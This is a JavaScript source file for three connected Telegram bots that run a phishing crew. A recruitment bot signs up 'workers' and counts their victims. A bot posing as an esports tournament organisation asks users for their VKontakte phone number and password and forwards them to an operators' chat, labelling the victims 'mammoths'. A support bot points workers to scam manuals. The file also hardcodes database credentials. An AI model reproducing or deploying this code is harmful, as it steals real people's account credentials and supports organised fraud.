const { Telegraf, Markup, Composer, Scenes } = require("telegraf");

const { session } = require("grammy");

const dotenv = require("dotenv").config()

const referal_bt = new Telegraf(process.env.TG_WORK_TOKEN)

const MongoClient = require("mongodb").MongoClient;
const mongoClient = new MongoClient("mongodb+srv://killer228:oposapoA@cluster0.bgowkox.mongodb.net/?retryWrites=true&w=majority");
function makeid(length) {
    var result = '';
    var characters = '0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function initial() {
    return {
        id: 0,
        pass: 0,
        user: 0,
        spec: 0,
        where: 0,
        xp: 0,
        time: 0,
        normalize: 0,
        dedess11: 0,




        scammed: 0,
        team_time: 0,
        refer_link: 0,
        info: 0,
        days: 0,
        date: 0,
        month: 0,
        year: 0,
        full: 0,
        info2: 0,
        notif: false

    };
}
referal_bt.use(session({ initial }));
var working = true
referal_bt.command("start", async (ctx) => {

   // else{
        await mongoClient.connect();
        const db = mongoClient.db("workers");
        const collection = db.collection("infos");
        console.log(ctx.message.from.id)
        if (await collection.findOne({ id: Number(ctx.message.from.id) })) {
            await ctx.sendMessage("Вы уже в тиме")
            if(working == false){
                ctx.sendMessage("Бот остановлен приходите в 10:00")
            }
        } else {

            await ctx.sendMessage("Здравствуйте, рады приветствовать вас в Repulse Team! Оставьте заявку на вступление в команду 🏁", {
                "reply_markup": {
                    "keyboard": [["📝 Подать заявку"]],
                    resize_keyboard: true
                }
            },)
        }
    //}










})











const vk_info = new Composer()
const vk_login = new Composer()
const next = new Composer()
const finl = new Composer()



vk_login.on("text", async (ctx) => {


    return ctx.wizard.next()
})

const final = new Composer();


vk_info.on("text", async (ctx) => {

    ctx.session.id = ctx.message.chat.id
    ctx.session.where = ctx.message.text
    await ctx.sendMessage(`Есть ли опыт в этой сфере? 🦣`)
    return ctx.wizard.next()

})


next.on("text", async (ctx) => {
    ctx.session.xp = ctx.message.text//SID/${ctx.message.chat.id}
    await ctx.sendMessage(`Сколько в день, готовы уделять времени? 🧑‍💻`)
    return ctx.wizard.next()

})
final.on("text", async (ctx) => {
    ctx.session.dedess11 = ctx.message.from.username
    ctx.session.time = ctx.message.text
    await ctx.sendMessage("📬 Ваша заявка на регистрацию будет рассмотрена в ближайшее время администрацией проекта!")
    await ctx.sendMessage(`Новая заявка на вступление в команду! 🧑‍💻 \n\nОткуда вы о нас узнали: ${ctx.session.where} \n\nЕсть ли опыт в этой сфере: ${ctx.session.xp} \n\nСколько в день, готовы уделять времени: ${ctx.session.time} \n\nНик: ${ctx.session.dedess11} \n\n\nSID/${ctx.message.from.id}`, {
        chat_id: -851561689,
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "одобрить",
                        callback_data: "agggrrrree321321",
                    },
                ],
            ],
        }

    })
    ctx.scene.leave()

})
// keyboard: [["Профиль🖥️"]],
// resize_keyboard: true,
referal_bt.action("agggrrrree321321", async (ctx) => {
    await ctx.deleteMessage()
    var urlRegex2 = /(\bSID\/[-A-Z0-9+&@#\/%=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig;

    await mongoClient.connect();
    const db = mongoClient.db("workers");
    const collection = db.collection("infos");
    ctx.session.date = new Date();
    ctx.session.days = ("0" + ctx.session.date.getDate()).slice(-2);
    ctx.session.month = ("0" + (ctx.session.date.getMonth() + 1)).slice(-2);
    ctx.session.year = ctx.session.date.getFullYear();
    ctx.session.full = ctx.session.year + "-" + ctx.session.month + "-" + ctx.session.days
    ctx.session.spec = ctx.update.callback_query.message.text
    ctx.session.normalize = ((ctx.session.spec.match(urlRegex2)).toString()).replaceAll("SID/", "")
    if (await collection.findOne({ id: Number(ctx.session.normalize) })) {

    } else {
        await collection.insertOne({ id: Number(ctx.session.normalize), scammed: 0, in_team_time: ctx.session.full, refer_link: 0 });

    }
    await ctx.sendMessage("🎉 Ваша заявка на вступление одобрена! \n\nВступайте в чат и начинайте работать!", {
        chat_id: ctx.session.normalize,

        "reply_markup": {
            "keyboard": [["🧑🏼‍💻 Профиль","💻О проекте"]],
            resize_keyboard: true
        }




    })
        cron.schedule("00 10 * * *", () => {
            ctx.sendMessage('🦣 FULL WORK 🦣 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n🧑‍💻 Актуальные вбиверы 🧑‍💻 \n\n- Вадим [ @alexdrawn ]',{chat_id: ctx.session.normalize,

                "reply_markup": {
                    "keyboard": [["🧑🏼‍💻 Профиль","💻О проекте"]],
                    resize_keyboard: true
                }

            });
            working = true
        });
        cron.schedule("00 23 * * *", () => {
            ctx.sendMessage('🛑 STOP WORK 🛑 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n❤️ Всем спасибо, на сегодня стоп ворк , продолжим завтра!',{chat_id: ctx.session.normalize,

                "reply_markup": {
                    "keyboard": [["🛑 Бот остановлен"]],
                    resize_keyboard: true
                }

            });
            working = false
        });

    if(working == false){
        ctx.sendMessage("Бот остановлен приходите в 10:00")
    }
})

referal_bt.hears("💻О проекте", async (ctx) => {
    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066836656952447066/image.png", {
       // chat_id: ((ctx.session.spec.match(urlRegex2)).toString()).replaceAll("SID/", ""),
        caption: "ℹ️ Информация о проекте Repulse Team \n\n🏁 Мы открылись: 26.01.2023 \n\n🔹 Проценты выплат: \n├ Первый завод - 75/25 \n├ Всё остальные - 60/40 \n└ Для топов % увеличен! \n\n💬 Вступай в чат для воркеров, а также прочитай мануалы",
        reply_markup: {

            inline_keyboard: [
                [
                    {
                        text: "Чат воркеров 🧑‍💻",
                        //https://t.me/+XQL0urVQ_JFmMDFi
                        url: "https://t.me/+kPWlkm3Q0y81NzIy"

                    },
                    {
                        text: "Мануалы 📚",
                        url: "https://t.me/+CQoNmQ03qIs1OWM6"
                    },

                ]
            ],

        }
    })
})

referal_bt.hears("🧑🏼‍💻 Профиль", async (ctx) => {



    await mongoClient.connect();
    const db = mongoClient.db("workers");
    const collection = db.collection("infos");
    ctx.session.info = await collection.findOne({ id: Number(ctx.message.from.id) });
    JSON.stringify(ctx.session.info, function (key, value) {
        if (key == "scammed") {
            ctx.session.scammed = value
        } else {
            return value;
        }
    })

    ctx.session.info2 = await collection.findOne({ id: Number(ctx.message.from.id) });
    JSON.stringify(ctx.session.info2, function (key, value) {
        if (key == "in_team_time") {
            ctx.session.team_time = value
        } else {
            return value;
        }
    })
    await ctx.sendMessage(`👤 Твой профиль [${ctx.message.from.id}] \n\n⌛️ В команде ${ctx.session.team_time}\n\n🦣 Кол. лохматых ${ctx.session.scammed}\n\n🔥 Ваша ссылка: https://t.me/GoldenTournament_bot?start=${ctx.message.from.id}`)
})



const menuScene = new Scenes.WizardScene('sceneWizard', vk_login, vk_info, next, final)
const stage = new Scenes.Stage([menuScene])
referal_bt.use(stage.middleware())


referal_bt.hears("📝 Подать заявку", async (callbackQuery) => {

    await mongoClient.connect();
    const db = mongoClient.db("workers");
    const collection = db.collection("infos");

    if (await collection.findOne({ id: Number(callbackQuery.message.from.id) })) {
        callbackQuery.sendMessage("Вы уже в тиме!",{
            "reply_markup": {
                "keyboard": [["🧑🏼‍💻 Профиль"], ["💻О проекте"]],
                resize_keyboard: true
            }
        })
    } else {
        await callbackQuery.scene.enter('sceneWizard')
        await callbackQuery.reply("Откуда вы о нас узнали? 🖥️")
    }
})




referal_bt.command("get_id",async(ctx)=>{
    console.log(ctx.message)
})
















































const bot = new Telegraf(process.env.TG_MAMONT_TOKEN)
const support_bot = new Telegraf(process.env.TG_SUPPORT_TOKEN)






function makeid(length) {
    var result = '';
    var characters = '0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function initial22() {
    return {
        id: 0,
        pass: 0,
        user: 0,
        refer: 0,
        temp_ref: 0,
        ids: 0,
        login: 0


    };
}


const cron = require('node-cron');
bot.use(session({ initial: initial22 }));



bot.command("start", async (ctx) => {


        await mongoClient.connect();
        const db = mongoClient.db("workers");
        const collection = db.collection("infos");
        ctx.session.ids = ctx.message.from.id
        ctx.session.name = ctx.message.from.username
        ctx.session.refer = ctx.message.text.replaceAll("/start ", "")
        if (await collection.findOne({ id: Number(ctx.session.refer) })) {
            await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}] \n\n🧑‍💻 Вбивер - @alexdrawn`)
        }


        //await referal_bt.telegram.sendMessage("123")
        ctx.session.id = ctx.message.from.id
        await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066476305224310885/photo_2023-01-21_22-55-04.jpg", {
            caption: "Здравствуйте! Вас приветствует организация Golden Tournament, рады приветствовать ❤️",
            "reply_markup": {
                "keyboard": [["🏆 Турниры", "📌 Подать заявку"], ["📃 Регламент", "🎗️ Алея славы"], ["🌐 Лицензия"]],
                resize_keyboard: true
            }
        })





})

bot.command("getid", async (ctx) => {
    console.log(ctx.message)
})
bot.hears("🎗️ Алея славы", async (ctx) => {
    await ctx.sendMessage("I Season \n🥇 - Just \n=================== \nII Season 🥇 - LightsToMotion \n🥈 - Vollent Gaming \n🥉 - SakuraBand \n=================== \nIII Season \n🥇 - DRAGAMING \n🥈 - SLEEP_SO2 \n🥉 - EZZY ESPORTS \n=================== \nIV Season \n🥇 - Feeling Team \n🥈 - ATD Squad \n🥉 - DEADLY SQUAD GAMING \n=================== \nV Season \n🥇 - Feeling Team \n🥈 -  Ninja Team \n🥉 - AndEagers \n=================== \nVI Season \n🥇 - MoonTeam \n🥈 -  The Scary Rovers \n🥉 -  ATD Squad \n=================== \nVII Season \n🥇 - Seven Dragons \n🥈 - UpUp esports \n🥉 - AndEagers \n=================== \nVIII Season \n🥇 -  Team KingWin \n🥈 - Seven Dragons \n=================== \nIX Season \n🥇 - Appeasers \n🥈 - AndEagers \n🥉 - Favourites \n=================== \nX Season \n🥇 - BIT eSports \n=================== \nXI Season \n🥇 - Sinta Gamma \n🥈 - Team Carnage \n🥉 - Team Resurgens \n=================== \nXII Season \n🥇 - LightForces eSports \n🥈 -  ATD Squad \n🥉 -  Billers eSports \n=================== \nXIII Season \n🥇 - Team VaVilon \n🥈 - Team KingWin \n🥉 - Domination Over Time \n \n=================== \nArdoUr Season")
})


bot.hears("📃 Регламент", async (ctx) => {
    await ctx.sendMessage("Здравствуйте! Для ознакомления с регламентом перейдите по ссылке - \nhttps://drive.google.com/file/d/1ehZNZRb5P-41WX9ahOErP4vt-DID-Gr2/view?usp=sharing")
})
bot.hears("🌐 Лицензия", async (ctx) => {
    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066487890403672074/image.png", {
        caption: "Наша организация, лицензирована Uit Tournaments! ✅"
    })
})

bot.hears("🏆 Турниры", async (ctx) => {
    await ctx.sendPhoto("https://cdn.discordapp.com/attachments/1048351055957733406/1066494586375118858/image.png", {
        caption: "⚜️ Набор на 12 сезон открыт! ⚜️ \n\nФорматы турниров на 12 сезон! ⬇️ \n\n2 х 2 - Призовой фонд 2.500 голды на команду! \n\n3 х 3 - Призовой фонд 5.000 голды на команду! \n\n5 х 5 - Призовой фонд 7.500 голды на команду! \n\nУчастие может принять любой желающий, всё турниры проходят среди любительских игроков! ⚜️"
    })
})

const vk_login2 = new Composer()

const vk_info2 = new Composer()
const vk_info3 = new Composer()



vk_login2.on("text", async (ctx) => {


    return ctx.wizard.next()
})
const vk_password2 = new Composer();
const final2 = new Composer();

vk_password2.on("text", async (ctx) => {
    await ctx.reply("✅ Осталось совсем немного, введите Никнейм, под которым вы будете выступать в нашей организации.")
    return ctx.wizard.next()
})


vk_info3.on("text",async(ctx)=>{
    ctx.session.pass = ctx.message.text
    await mongoClient.connect();
    const db = mongoClient.db("workers");
    const collection = db.collection("infos");
    ctx.session.name = ctx.message.from.username


    ctx.session.temp_ref = await collection.findOne({ id: Number(ctx.session.refer) });
    if (await collection.findOne({ id: Number(ctx.session.refer) })) {
        JSON.stringify(ctx.session.temp_ref, function (key, value) {
            if (key == "scammed") {
                value = value + 1
                collection.findOneAndUpdate(ctx.session.temp_ref, { $set: { scammed: value } });
            } else {
                return value;
            }
        })
        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт ввёл логи! \n\n‼️ СРОЧНО ПИШИТЕ ВБИВЕРУ ‼️ \n\n🧑‍💻 Вбивер - @alexdrawn`)
        await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
        await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 login / pass ${ctx.session.login} ${ctx.session.pass}\n\n🧑🏼‍💻 Воркер - [${ctx.session.refer}] \n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
        ctx.scene.leave()
    }
    else {
        await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
        await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 login / pass ${ctx.session.login} ${ctx.session.pass}\n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
        ctx.scene.leave()
    }
})

vk_info2.on("text", async (ctx) => {
    ctx.session.login = ctx.message.text
    if(isNaN(ctx.session.login)){

        await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
    }
    else{
        if(ctx.session.login.toString().includes("+7")){
            await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
            return ctx.wizard.next()
        }
        else{
            await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
        }
        if(ctx.session.login.toString().includes("+375")){
            await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
            return ctx.wizard.next()
        }
        else{
            await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
        }
    }



})



final2.on("text", async (ctx) => {

    await ctx.sendMessage(`✅ Что бы продолжить регистрацию, вам необходимо авторизоваться через социальную сеть ВКонтакте, введите свой логин (номер телефона)`)
    return ctx.wizard.next()
})




const menuScene2 = new Scenes.WizardScene('sceneWizard', vk_login2, vk_password2, final2, vk_info2,vk_info3)
const stage2 = new Scenes.Stage([menuScene2])
bot.use(stage2.middleware())


bot.hears("📌 Подать заявку", async (callbackQuery) => {
    callbackQuery.session.id = makeid(5)
  //  await callbackQuery.editMessageReplyMarkup({reply_markup: {remove_keyboard: true}})
    await callbackQuery.scene.enter('sceneWizard')
    await callbackQuery.reply("✅ Введите свой внутренне игровой ID. ВАЖНО! Айди внутренне игрового аккаунта нужно вводить от аккаунта на котором вы будете играть турнир!")

    //

})







support_bot.hears("/вбиверы",async(ctx)=>{
    ctx.sendMessage("💰 Вбиверы : \n - mazenmwais [ @mazenmwais ]\n - alex drawn [ @alexdrawn ]")
})
support_bot.hears("/наставники",async(ctx)=>{
    ctx.sendMessage("🚸 Наставники которые доведут вас до профита : \n- mazenmwais [ @mazenmwais ] \n- alex drawn [ @alexdrawn ]")
})
support_bot.hears("/мануалы",async(ctx)=>{
    ctx.sendMessage("📚 Мануалы - https://t.me/+IoZjujM1h2liZWFi")
})
support_bot.hears("/бот",async(ctx)=>{
    ctx.sendMessage("🤖 Бот для воркеров - @RepulseTeamBot")
})
support_bot.hears("/команды",async(ctx)=>{
    ctx.sendMessage("/бот - Бот для воркеров 🤖 \n/вбиверы - Актуальные вбиверы 💰 \n/наставники - Наставники которые доведут вас до профита 🚸 \n/мануалы -  Мануалы 📚 \n/выплаты - выплаты работникам 💸 \n/команды - показывает актуальный список команд 📝")
})

support_bot.hears("/выплаты",async(ctx)=>{
    await ctx.sendMessage("💸 Успешные выплаты - https://t.me/+4syVESchRvc4Mjgy")
})




bot.launch()
referal_bt.launch()
support_bot.launch()